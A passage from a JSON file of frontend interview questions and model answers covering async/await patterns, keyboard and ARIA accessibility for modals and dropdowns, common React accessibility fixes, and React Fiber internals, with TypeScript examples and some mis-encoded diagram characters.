module.ts\nconst config = await loadConfig();\nexport { config };\n\n// Importing module waits for await to complete\nimport { config } from './module.ts';\n// config is guaranteed to be loaded\n```\n\n## Common Patterns\n\n```typescript\n// 1. Timeout wrapper\nfunction timeout<T>(promise: Promise<T>, ms: number): Promise<T> {\n  return Promise.race([\n    promise,\n    new Promise<never>((_, reject) =>\n      setTimeout(() => reject(new Error('Timeout')), ms)\n    ),\n  ]);\n}\n\nconst data = await timeout(fetchData(), 5000);\n\n// 2. Retry with backoff\nasync function retry<T>(\n  fn: () => Promise<T>,\n  maxAttempts = 3,\n  delay = 1000\n): Promise<T> {\n  for (let attempt = 1; attempt <= maxAttempts; attempt++) {\n    try {\n      return await fn();\n    } catch (error) {\n      if (attempt === maxAttempts) throw error;\n      await new Promise(r => setTimeout(r, delay * attempt));\n    }\n  }\n  throw new Error('Unreachable');\n}\n\n// 3. Async IIFE (for non-module contexts)\n(async () => {\n  const data = await fetchData();\n  console.log(data);\n})();\n```",
      "keyPoints": [
        "Knows async/await is Promise syntax sugar",
        "Understands suspension points at await",
        "Can trace execution order correctly",
        "Knows parallel vs sequential patterns",
        "Handles errors properly",
        "Understands top-level await"
      ],
      "followUpQuestions": [
        "How would you handle cleanup in async functions?",
        "What about async generators?",
        "How do async stack traces work?",
        "When would you prefer raw Promises over async/await?"
      ],
      "relatedTopics": [
        "promises",
        "event-loop",
        "error-handling"
      ],
      "source": "seed",
      "commonAt": [
        "General JavaScript knowledge"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "accessibility-001",
      "category": "accessibility",
      "difficulty": "senior",
      "question": "How would you implement accessible keyboard navigation for a complex component like a dropdown menu or modal? Cover focus management, keyboard traps, and ARIA attributes.",
      "answer": "## Modal Accessibility Implementation\n\n### 1. Focus Management\n\n```typescript\nfunction Modal({ \n  isOpen, \n  onClose, \n  children \n}: { \n  isOpen: boolean; \n  onClose: () => void; \n  children: React.ReactNode;\n}) {\n  const modalRef = useRef<HTMLDivElement>(null);\n  const previousFocusRef = useRef<HTMLElement | null>(null);\n  \n  useEffect(() => {\n    if (isOpen) {\n      // Save current focus\n      previousFocusRef.current = document.activeElement as HTMLElement;\n      \n      // Focus first focusable element in modal\n      const focusableElements = getFocusableElements(modalRef.current);\n      focusableElements[0]?.focus();\n      \n      // Prevent body scroll\n      document.body.style.overflow = 'hidden';\n    }\n    \n    return () => {\n      // Restore focus when closing\n      previousFocusRef.current?.focus();\n      document.body.style.overflow = '';\n    };\n  }, [isOpen]);\n  \n  if (!isOpen) return null;\n  \n  return createPortal(\n    <div \n      className=\"modal-backdrop\"\n      onClick={onClose}\n      aria-hidden=\"true\"\n    >\n      <div\n        ref={modalRef}\n        role=\"dialog\"\n        aria-modal=\"true\"\n        aria-labelledby=\"modal-title\"\n        aria-describedby=\"modal-description\"\n        onClick={e => e.stopPropagation()}\n        onKeyDown={e => handleKeyDown(e, modalRef.current, onClose)}\n      >\n        <h2 id=\"modal-title\">Modal Title</h2>\n        <p id=\"modal-description\">Modal description for screen readers</p>\n        {children}\n        <button onClick={onClose}>Close</button>\n      </div>\n    </div>,\n    document.body\n  );\n}\n```\n\n### 2. Focus Trap\n\n```typescript\nfunction getFocusableElements(container: HTMLElement | null): HTMLElement[] {\n  if (!container) return [];\n  \n  const selector = [\n    'button:not([disabled])',\n    'input:not([disabled])',\n    'select:not([disabled])',\n    'textarea:not([disabled])',\n    'a[href]',\n    '[tabindex]:not([tabindex=\"-1\"])',\n  ].join(', ');\n  \n  return Array.from(container.querySelectorAll<HTMLElement>(selector));\n}\n\nfunction handleKeyDown(\n  event: React.KeyboardEvent,\n  container: HTMLElement | null,\n  onClose: () => void\n) {\n  if (!container) return;\n  \n  switch (event.key) {\n    case 'Escape':\n      event.preventDefault();\n      onClose();\n      break;\n      \n    case 'Tab':\n      const focusableElements = getFocusableElements(container);\n      const firstElement = focusableElements[0];\n      const lastElement = focusableElements[focusableElements.length - 1];\n      \n      if (event.shiftKey) {\n        // Shift+Tab: going backwards\n        if (document.activeElement === firstElement) {\n          event.preventDefault();\n          lastElement?.focus();\n        }\n      } else {\n        // Tab: going forward\n        if (document.activeElement === lastElement) {\n          event.preventDefault();\n          firstElement?.focus();\n        }\n      }\n      break;\n  }\n}\n```\n\n### 3. Reusable Focus Trap Hook\n\n```typescript\nfunction useFocusTrap(isActive: boolean) {\n  const containerRef = useRef<HTMLDivElement>(null);\n  const previousFocusRef = useRef<HTMLElement | null>(null);\n  \n  useEffect(() => {\n    if (!isActive) return;\n    \n    previousFocusRef.current = document.activeElement as HTMLElement;\n    \n    const container = containerRef.current;\n    if (!container) return;\n    \n    // Focus first element\n    const focusable = getFocusableElements(container);\n    focusable[0]?.focus();\n    \n    function handleKeyDown(e: KeyboardEvent) {\n      if (e.key !== 'Tab') return;\n      \n      const focusable = getFocusableElements(container);\n      const first = focusable[0];\n      const last = focusable[focusable.length - 1];\n      \n      if (e.shiftKey && document.activeElement === first) {\n        e.preventDefault();\n        last?.focus();\n      } else if (!e.shiftKey && document.activeElement === last) {\n        e.preventDefault();\n        first?.focus();\n      }\n    }\n    \n    document.addEventListener('keydown', handleKeyDown);\n    \n    return () => {\n      document.removeEventListener('keydown', handleKeyDown);\n      previousFocusRef.current?.focus();\n    };\n  }, [isActive]);\n  \n  return containerRef;\n}\n```\n\n## Dropdown Menu Implementation\n\n```typescript\nfunction DropdownMenu({ \n  trigger, \n  items \n}: { \n  trigger: React.ReactNode;\n  items: { label: string; onClick: () => void; disabled?: boolean }[];\n}) {\n  const [isOpen, setIsOpen] = useState(false);\n  const [activeIndex, setActiveIndex] = useState(-1);\n  const triggerRef = useRef<HTMLButtonElement>(null);\n  const menuRef = useRef<HTMLUListElement>(null);\n  const itemRefs = useRef<(HTMLLIElement | null)[]>([]);\n  \n  // Generate unique IDs\n  const menuId = useId();\n  \n  // Handle keyboard navigation\n  const handleKeyDown = (event: React.KeyboardEvent) => {\n    switch (event.key) {\n      case 'ArrowDown':\n        event.preventDefault();\n        if (!isOpen) {\n          setIsOpen(true);\n          setActiveIndex(0);\n        } else {\n          setActiveIndex(prev => \n            prev < items.length - 1 ? prev + 1 : 0\n          );\n        }\n        break;\n        \n      case 'ArrowUp':\n        event.preventDefault();\n        if (isOpen) {\n          setActiveIndex(prev => \n            prev > 0 ? prev - 1 : items.length - 1\n          );\n        }\n        break;\n        \n      case 'Enter':\n      case ' ':\n        event.preventDefault();\n        if (isOpen && activeIndex >= 0) {\n          items[activeIndex].onClick();\n          setIsOpen(false);\n          triggerRef.current?.focus();\n        } else {\n          setIsOpen(true);\n          setActiveIndex(0);\n        }\n        break;\n        \n      case 'Escape':\n        event.preventDefault();\n        setIsOpen(false);\n        triggerRef.current?.focus();\n        break;\n        \n      case 'Tab':\n        setIsOpen(false);\n        break;\n        \n      case 'Home':\n        event.preventDefault();\n        setActiveIndex(0);\n        break;\n        \n      case 'End':\n        event.preventDefault();\n        setActiveIndex(items.length - 1);\n        break;\n    }\n  };\n  \n  // Focus active item\n  useEffect(() => {\n    if (isOpen && activeIndex >= 0) {\n      itemRefs.current[activeIndex]?.focus();\n    }\n  }, [isOpen, activeIndex]);\n  \n  // Close on outside click\n  useEffect(() => {\n    if (!isOpen) return;\n    \n    function handleClick(e: MouseEvent) {\n      if (!menuRef.current?.contains(e.target as Node) &&\n          !triggerRef.current?.contains(e.target as Node)) {\n        setIsOpen(false);\n      }\n    }\n    \n    document.addEventListener('click', handleClick);\n    return () => document.removeEventListener('click', handleClick);\n  }, [isOpen]);\n  \n  return (\n    <div className=\"dropdown\" onKeyDown={handleKeyDown}>\n      <button\n        ref={triggerRef}\n        aria-haspopup=\"menu\"\n        aria-expanded={isOpen}\n        aria-controls={menuId}\n        onClick={() => setIsOpen(!isOpen)}\n      >\n        {trigger}\n      </button>\n      \n      {isOpen && (\n        <ul\n          ref={menuRef}\n          id={menuId}\n          role=\"menu\"\n          aria-labelledby=\"dropdown-trigger\"\n        >\n          {items.map((item, index) => (\n            <li\n              key={index}\n              ref={el => itemRefs.current[index] = el}\n              role=\"menuitem\"\n              tabIndex={activeIndex === index ? 0 : -1}\n              aria-disabled={item.disabled}\n              onClick={() => {\n                if (!item.disabled) {\n                  item.onClick();\n                  setIsOpen(false);\n                  triggerRef.current?.focus();\n                }\n              }}\n            >\n              {item.label}\n            </li>\n          ))}\n        </ul>\n      )}\n    </div>\n  );\n}\n```\n\n## ARIA Attributes Reference\n\n```html\n<!-- Modal -->\n<div role=\"dialog\" aria-modal=\"true\" aria-labelledby=\"title\" aria-describedby=\"desc\">\n  <h2 id=\"title\">Title</h2>\n  <p id=\"desc\">Description</p>\n</div>\n\n<!-- Dropdown -->\n<button aria-haspopup=\"menu\" aria-expanded=\"false\" aria-controls=\"menu-id\">\n  Menu\n</button>\n<ul id=\"menu-id\" role=\"menu\">\n  <li role=\"menuitem\" tabindex=\"-1\">Item 1</li>\n  <li role=\"menuitem\" tabindex=\"-1\" aria-disabled=\"true\">Item 2</li>\n</ul>\n\n<!-- Tabs -->\n<div role=\"tablist\" aria-label=\"Settings\">\n  <button role=\"tab\" aria-selected=\"true\" aria-controls=\"panel-1\">Tab 1</button>\n  <button role=\"tab\" aria-selected=\"false\" aria-controls=\"panel-2\">Tab 2</button>\n</div>\n<div role=\"tabpanel\" id=\"panel-1\" aria-labelledby=\"tab-1\">Content 1</div>\n<div role=\"tabpanel\" id=\"panel-2\" aria-labelledby=\"tab-2\" hidden>Content 2</div>\n```\n\n## Common Patterns\n\n| Component | Key Behaviors |\n|-----------|--------------|\n| Modal | Focus trap, Escape closes, aria-modal |\n| Dropdown | Arrow keys, Enter/Space select, Escape closes |\n| Tabs | Arrow keys navigate, Home/End, no trap |\n| Combobox | Arrow keys, filtering, aria-activedescendant |\n| Tree | Arrow keys (horizontal for expand), Home/End |",
      "keyPoints": [
        "Implements proper focus management",
        "Creates focus traps correctly",
        "Handles all keyboard interactions",
        "Uses correct ARIA attributes",
        "Restores focus on close",
        "Manages roving tabindex for menus"
      ],
      "followUpQuestions": [
        "How would you test these accessibility features?",
        "What about touch device accessibility?",
        "How do you handle dynamic content announcements?",
        "What's the difference between aria-label and aria-labelledby?"
      ],
      "relatedTopics": [
        "a11y",
        "keyboard-navigation",
        "aria",
        "focus-management"
      ],
      "source": "seed",
      "commonAt": [
        "Any company caring about accessibility"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "accessibility-002",
      "category": "accessibility",
      "difficulty": "mid",
      "question": "What are the most common accessibility issues you've encountered in React applications, and how do you fix them?",
      "answer": "## Top Accessibility Issues & Fixes\n\n### 1. Missing or Poor Alt Text\n\n```tsx\n// âŒ Bad\n<img src=\"chart.png\" />\n<img src=\"profile.jpg\" alt=\"image\" />\n<img src=\"icon.svg\" alt=\"icon\" />\n\n// âœ… Good - Descriptive alt for meaningful images\n<img src=\"chart.png\" alt=\"Q3 revenue increased 25% compared to Q2\" />\n<img src=\"profile.jpg\" alt=\"Jane Smith, CEO\" />\n\n// âœ… Good - Empty alt for decorative images\n<img src=\"decorative-border.png\" alt=\"\" role=\"presentation\" />\n\n// âœ… Good - Icon buttons need accessible name\n<button aria-label=\"Close dialog\">\n  <img src=\"close-icon.svg\" alt=\"\" />\n</button>\n```\n\n### 2. Missing Form Labels\n\n```tsx\n// âŒ Bad - No label\n<input type=\"email\" placeholder=\"Enter email\" />\n\n// âŒ Bad - Placeholder is not a label\n<input type=\"email\" placeholder=\"Email\" />\n\n// âœ… Good - Explicit label\n<label htmlFor=\"email\">Email</label>\n<input type=\"email\" id=\"email\" />\n\n// âœ… Good - Implicit label (wrapping)\n<label>\n  Email\n  <input type=\"email\" />\n</label>\n\n// âœ… Good - Visually hidden but accessible\n<label htmlFor=\"search\" className=\"sr-only\">Search products</label>\n<input type=\"search\" id=\"search\" placeholder=\"Search...\" />\n\n// CSS for sr-only\n.sr-only {\n  position: absolute;\n  width: 1px;\n  height: 1px;\n  padding: 0;\n  margin: -1px;\n  overflow: hidden;\n  clip: rect(0, 0, 0, 0);\n  white-space: nowrap;\n  border: 0;\n}\n```\n\n### 3. Poor Color Contrast\n\n```css\n/* âŒ Bad - Low contrast */\n.text {\n  color: #999999; /* on white background - 2.8:1 ratio */\n}\n\n/* âœ… Good - Meets WCAG AA (4.5:1 for normal text) */\n.text {\n  color: #595959; /* on white background - 7:1 ratio */\n}\n\n/* âœ… Good - Large text can have lower contrast (3:1) */\n.heading {\n  font-size: 24px;\n  font-weight: bold;\n  color: #767676; /* 4.5:1 is fine for large text */\n}\n```\n\n### 4. Non-Semantic HTML\n\n```tsx\n// âŒ Bad - Div soup\n<div className=\"header\">\n  <div className=\"nav\">\n    <div onClick={goHome}>Home</div>\n    <div onClick={goAbout}>About</div>\n  </div>\n</div>\n\n// âœ… Good - Semantic HTML\n<header>\n  <nav aria-label=\"Main navigation\">\n    <a href=\"/\">Home</a>\n    <a href=\"/about\">About</a>\n  </nav>\n</header>\n\n// Semantic elements to use:\n<main>        // Main content\n<article>     // Self-contained content\n<section>     // Thematic grouping\n<aside>       // Tangentially related content\n<header>      // Introductory content\n<footer>      // Footer content\n<nav>         // Navigation\n<figure>      // Illustrations, diagrams\n<figcaption>  // Caption for figure\n```\n\n### 5. Click Handlers on Non-Interactive Elements\n\n```tsx\n// âŒ Bad - Not keyboard accessible\n<div onClick={handleClick}>Click me</div>\n<span onClick={handleClick}>Action</span>\n\n// âœ… Good - Use button\n<button onClick={handleClick}>Click me</button>\n\n// âœ… Good - If must use div, add all necessary attributes\n<div\n  role=\"button\"\n  tabIndex={0}\n  onClick={handleClick}\n  onKeyDown={(e) => {\n    if (e.key === 'Enter' || e.key === ' ') {\n      e.preventDefault();\n      handleClick();\n    }\n  }}\n>\n  Click me\n</div>\n\n// âœ… Better - Use a link for navigation\n<a href=\"/products\">View Products</a>\n```\n\n### 6. Missing Skip Links\n\n```tsx\n// âœ… Add skip link as first focusable element\nfunction App() {\n  return (\n    <>\n      <a href=\"#main-content\" className=\"skip-link\">\n        Skip to main content\n      </a>\n      <Header />\n      <main id=\"main-content\" tabIndex={-1}>\n        {/* Content */}\n      </main>\n    </>\n  );\n}\n\n// CSS\n.skip-link {\n  position: absolute;\n  top: -40px;\n  left: 0;\n  padding: 8px;\n  background: #000;\n  color: #fff;\n  z-index: 100;\n}\n\n.skip-link:focus {\n  top: 0;\n}\n```\n\n### 7. Auto-Playing Media\n\n```tsx\n// âŒ Bad - Auto-plays without user control\n<video autoPlay src=\"intro.mp4\" />\n\n// âœ… Good - Muted autoplay is acceptable, with controls\n<video autoPlay muted controls src=\"intro.mp4\">\n  <track kind=\"captions\" src=\"captions.vtt\" label=\"English\" />\n</video>\n\n// âœ… Good - No autoplay, user initiates\n<video controls>\n  <source src=\"intro.mp4\" type=\"video/mp4\" />\n  <track kind=\"captions\" src=\"captions.vtt\" label=\"English\" />\n</video>\n```\n\n### 8. Missing Heading Hierarchy\n\n```tsx\n// âŒ Bad - Skipping levels, using for styling\n<h1>Page Title</h1>\n<h4>Section</h4>  {/* Skipped h2, h3 */}\n<h2>Another Section</h2>\n\n// âœ… Good - Proper hierarchy\n<h1>Page Title</h1>\n<h2>Section</h2>\n<h3>Subsection</h3>\n<h2>Another Section</h2>\n\n// Use CSS for styling, not heading levels\n<h2 className=\"text-sm font-normal\">Correctly sized h2</h2>\n```\n\n### 9. Missing Error Announcements\n\n```tsx\n// âŒ Bad - Errors only visible, not announced\n{error && <span className=\"error\">{error}</span>}\n\n// âœ… Good - Use aria-live for dynamic announcements\n<div aria-live=\"polite\" aria-atomic=\"true\">\n  {error && <span role=\"alert\">{error}</span>}\n</div>\n\n// âœ… Good - Associate error with input\n<input\n  id=\"email\"\n  aria-invalid={!!error}\n  aria-describedby={error ? 'email-error' : undefined}\n/>\n{error && <span id=\"email-error\" role=\"alert\">{error}</span>}\n```\n\n### 10. Motion Without Respecting Preferences\n\n```css\n/* âœ… Good - Respect user preferences */\n@media (prefers-reduced-motion: reduce) {\n  *,\n  *::before,\n  *::after {\n    animation-duration: 0.01ms !important;\n    animation-iteration-count: 1 !important;\n    transition-duration: 0.01ms !important;\n  }\n}\n```\n\n```typescript\n// React hook for motion preferences\nfunction usePrefersReducedMotion() {\n  const [prefersReducedMotion, setPrefersReducedMotion] = useState(\n    window.matchMedia('(prefers-reduced-motion: reduce)').matches\n  );\n  \n  useEffect(() => {\n    const mediaQuery = window.matchMedia('(prefers-reduced-motion: reduce)');\n    const handler = (e: MediaQueryListEvent) => setPrefersReducedMotion(e.matches);\n    \n    mediaQuery.addEventListener('change', handler);\n    return () => mediaQuery.removeEventListener('change', handler);\n  }, []);\n  \n  return prefersReducedMotion;\n}\n```\n\n## Quick Audit Checklist\n\n```markdown\n- [ ] All images have appropriate alt text\n- [ ] All form inputs have labels\n- [ ] Color contrast meets WCAG AA (4.5:1)\n- [ ] Page is navigable by keyboard only\n- [ ] Focus indicators are visible\n- [ ] Heading hierarchy is logical\n- [ ] Interactive elements are properly announced\n- [ ] Error messages are accessible\n- [ ] Skip link is present\n- [ ] No keyboard traps (except modals)\n```",
      "keyPoints": [
        "Knows common accessibility issues",
        "Can fix alt text properly",
        "Understands form labeling requirements",
        "Uses semantic HTML correctly",
        "Makes custom components keyboard accessible",
        "Implements skip links and error announcements"
      ],
      "followUpQuestions": [
        "How do you test for accessibility issues?",
        "What tools do you use for accessibility auditing?",
        "How do you prioritize accessibility fixes?",
        "What about accessibility in SPAs vs traditional sites?"
      ],
      "relatedTopics": [
        "a11y",
        "semantic-html",
        "wcag",
        "screen-readers"
      ],
      "source": "seed",
      "commonAt": [
        "Any company with accessibility requirements"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "react-internals-001",
      "category": "react-internals",
      "difficulty": "senior",
      "question": "Explain React's Fiber architecture. What problem does it solve, and how does it enable concurrent features like Suspense and transitions?",
      "answer": "## Why Fiber Was Created\n\nBefore Fiber (React 15 and earlier), React's reconciliation was **synchronous and recursive**. Once started, it couldn't be interrupted.\n\n```\nOld Stack Reconciler:\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Component Tree Reconciliation                          â”‚\nâ”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•       â”‚\nâ”‚  A â†’ B â†’ C â†’ D â†’ E â†’ F â†’ G â†’ ... (no interruption)     â”‚\nâ”‚  â”‚                                    â”‚                 â”‚\nâ”‚  Start                               End                â”‚\nâ”‚                                                         â”‚\nâ”‚  Problem: 100ms+ of work = 100ms of blocked main threadâ”‚\nâ”‚           = janky UI, dropped frames                    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n\nFiber Architecture:\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Work Units (Fibers)                                    â”‚\nâ”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•       â”‚\nâ”‚  A â†’ B â†’ C â†’ [PAUSE] â†’ D â†’ E â†’ [PAUSE] â†’ F â†’ G         â”‚\nâ”‚              â†“                 â†“                        â”‚\nâ”‚         Handle event      Handle animation              â”‚\nâ”‚                                                         â”‚\nâ”‚  Solution: Split work into units, yield to browser      â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## What is a Fiber?\n\nA Fiber is a **JavaScript object** that represents a unit of work. Each React element has a corresponding Fiber.\n\n```typescript\n// Simplified Fiber structure\ninterface Fiber {\n  // Instance\n  tag: WorkTag;           // FunctionComponent, ClassComponent, HostComponent, etc.\n  type: any;              // Component function/class or DOM tag name\n  stateNode: any;         // DOM node or class instance\n  \n  // Fiber Tree Structure\n  return: Fiber | null;   // Parent fiber\n  child: Fiber | null;    // First child fiber\n  sibling: Fiber | null;  // Next sibling fiber\n  \n  // Props and State\n  pendingProps: any;      // New props\n  memoizedProps: any;     // Props used in last render\n  memoizedState: any;     // State used in last render\n  \n  // Effects\n  flags: Flags;           // Side effects to perform (Placement, Update, Deletion)\n  subtreeFlags: Flags;    // Effects in subtree\n  \n  // Lanes (Priority)\n  lanes: Lanes;           // Work priority\n  childLanes: Lanes;      // Priority of work in children\n  \n  // Alternate\n  alternate: Fiber | null; // Work-in-progress or current fiber\n}\n```\n\n## Double Buffering: Current vs Work-in-Progress\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚   Current Tree      â”‚         â”‚   Work-in-Progress  â”‚\nâ”‚   (on screen)       â”‚â—„â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚   Tree (building)   â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤         â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚   Fiber A           â”‚         â”‚   Fiber A'          â”‚\nâ”‚     â”œâ”€â”€ Fiber B     â”‚         â”‚     â”œâ”€â”€ Fiber B'    â”‚\nâ”‚     â””â”€â”€ Fiber C     â”‚         â”‚     â””â”€â”€ Fiber C'    â”‚\nâ”‚          â””â”€â”€ Fiber Dâ”‚         â”‚          â””â”€â”€ Fiber D'â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚                               â”‚\n         â”‚    After commit, trees swap   â”‚\n         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n- **Current**: What's currently rendered on screen\n- **Work-in-Progress (WIP)**: Being built during reconciliation\n- After commit, WIP becomes current (pointer swap)\n\n## Two Phases: Render and Commit\n\n```\nRENDER PHASE (Interruptible)\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nâ€¢ Build work-in-progress tree\nâ€¢ Determine what changed\nâ€¢ Calculate side effects\nâ€¢ Can be paused, aborted, restarted\n\n                         â†“\n\nCOMMIT PHASE (Synchronous, Uninterruptible)\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nâ€¢ Apply DOM changes\nâ€¢ Run useLayoutEffect\nâ€¢ Run useEffect (scheduled)\nâ€¢ Must complete - can't pause\n```\n\n## How Fiber Enables Concurrency\n\n### Time Slicing\n\n```typescript\n// Simplified scheduler loop\nfunction workLoop(deadline: IdleDeadline) {\n  while (workInProgress !== null && deadline.timeRemaining() > 0) {\n    // Process one fiber unit\n    workInProgress = performUnitOfWork(workInProgress);\n  }\n  \n  if (workInProgress !== null) {\n    // More work to do, schedule continuation\n    requestIdleCallback(workLoop);\n  }\n}\n\nfunction performUnitOfWork(fiber: Fiber): Fiber | null {\n  // 1. Begin work on this fiber (call component, diff)\n  const next = beginWork(fiber);\n  \n  if (next) {\n    // Has child - process child next\n    return next;\n  }\n  \n  // 2. Complete work (finalize effects)\n  return completeUnitOfWork(fiber);\n}\n```\n\n### Priority Lanes\n\n```typescript\n// Different priorities for different updates\nconst SyncLane = 0b0000000000000000000000000000001;        // Highest (user input)\nconst InputContinuousLane = 0b0000000000000000000000000100; // Drag, scroll\nconst DefaultLane = 0b0000000000000000000000000010000;      // Normal updates\nconst TransitionLane = 0b0000000000000000000001000000;      // startTransition\nconst IdleLane = 0b0100000000000000000000000000000;         // Lowest (offscreen)\n\n// Higher priority work can interrupt lower priority\nfunction ensureRootIsScheduled(root: FiberRoot) {\n  const nextLanes = getNextLanes(root);\n  \n  if (nextLanes === NoLanes) {\n    return; // No work to do\n  }\n  \n  const existingCallbackPriority = root.callbackPriority;\n  const newCallbackPriority = getHighestPriorityLane(nextLanes);\n  \n  if (newCallbackPriority > existingCallbackPriority) {\n    // Cancel lower priority work, start higher priority\n    cancelCallback(root.callbackNode);\n  }\n  \n  // Schedule work at appropriate priority\n  root.callbackNode = scheduleCallback(\n    lanesToSchedulerPriority(newCallbackPriority),\n    performConcurrentWorkOnRoot.bind(null, root)\n  );\n}\n```\n\n## Suspense and Fiber\n\n```typescript\n// When a component suspends:\nfunction ComponentThatSuspends() {\n  const data = use(fetchData()); // Throws a Promise\n  return <div>{data}</div>;\n}\n\n// Fiber catches the promise:\nfunction renderWithHooks(fiber: Fiber) {\n  try {\n    const children = Component(props);\n    return children;\n  } catch (thrownValue) {\n    if (typeof thrownValue.then === 'function') {\n      // It's a promise - this is Suspense!\n      \n      // 1. Mark this fiber as suspended\n      fiber.flags |= DidCapture;\n      \n      // 2. Find nearest Suspense boundary\n      const suspenseBoundary = findSuspenseBoundary(fiber);\n      \n      // 3. Render fallback instead\n      suspenseBoundary.memoizedState = {\n        dehydrated: null,\n        retryLane: DefaultLane,\n      };\n      \n      // 4. When promise resolves, retry\n      thrownValue.then(\n        () => scheduleRetry(suspenseBoundary),\n        () => scheduleRetry(suspenseBoundary)\n      );\n    } else {\n      throw thrownValue; // Regular error\n    }\n  }\n}\n```\n\n## useTransition Implementation\n\n```typescript\nfunction useTransition(): [boolean, (callback: () => void) => void] {\n  const [isPending, setIsPending] = useState(false);\n  \n  const startTransition = useCallback((callback: () => void) => {\n    setIsPending(true);\n    \n    // Schedule the transition update at TransitionLane priority\n    const prevTransition = ReactCurrentBatchConfig.transition;\n    ReactCurrentBatchConfig.transition = {};\n    \n    try {\n      // Updates inside callback get TransitionLane priority\n      callback();\n    } finally {\n      ReactCurrentBatchConfig.transition = prevTransition;\n    }\n    \n    // isPending stays true until transition completes\n  }, []);\n  \n  return [isPending, startTransition];\n}\n\n// Usage\nconst [isPending, startTransition] = useTransition();\n\nfunction handleSearch(query: string) {\n  // High priority - update input immediately\n  setQuery(query);\n  \n  // Low priority - can be interrupted\n  startTransition(() => {\n    setSearchResults(search(query));\n  });\n}\n```\n\n## Key Fiber Benefits\n\n| Feature | How Fiber Enables It |\n|---------|---------------------|\n| Concurrent Rendering | Work can be paused/resumed |\n| Suspense | Can suspend and show fallback |\n| Transitions | Different priority lanes |\n| Time Slicing | Yield to browser between units |\n| Error Boundaries | Catch errors in render phase |\n| Streaming SSR | Incremental hydration |",
      "keyPoints": [
        "Understands why Fiber was created (blocking reconciliation)",
        "Knows Fiber node structure",
        "Can explain double buffering (current vs WIP)",
        "Understands render vs commit phases",
        "Knows how priority lanes work",
        "Can explain how Suspense leverages Fiber"
      ],
      "followUpQuestions": [
        "How does error boundary work with Fiber?",
        "What triggers a re-render in Fiber?",
        "How does React know when to yield to the browser?",
        "What's the difference between concurrent and synchronous mode?"
      ],
      "relatedTopics": [
        "reconciliation",
        "virtual-dom",
        "concurrent-react",
        "suspense"
      ],
      "source": "seed",
      "commonAt": [
        "Meta",
        "Companies using React heavily"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "react-internals-002",
      "category": "react-internals",
      "difficulty": "senior",
      "question": "How does React's reconciliation algorithm work? Explain the diffing heuristics and how the key prop optimizes list updates.",
